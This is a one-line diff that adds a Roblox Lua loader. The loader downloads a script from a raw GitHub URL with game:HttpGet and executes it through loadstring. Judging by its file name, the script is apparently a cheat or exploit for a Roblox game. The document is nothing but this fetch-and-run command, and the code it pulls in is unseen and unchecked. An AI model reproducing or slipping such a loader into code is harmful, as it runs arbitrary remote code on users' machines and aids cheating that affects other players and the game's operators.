@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TealKnightFree/loaders/main/loaders/clean-crew-class-skins-spam2-3hm1higmgzz5or.lua"))()
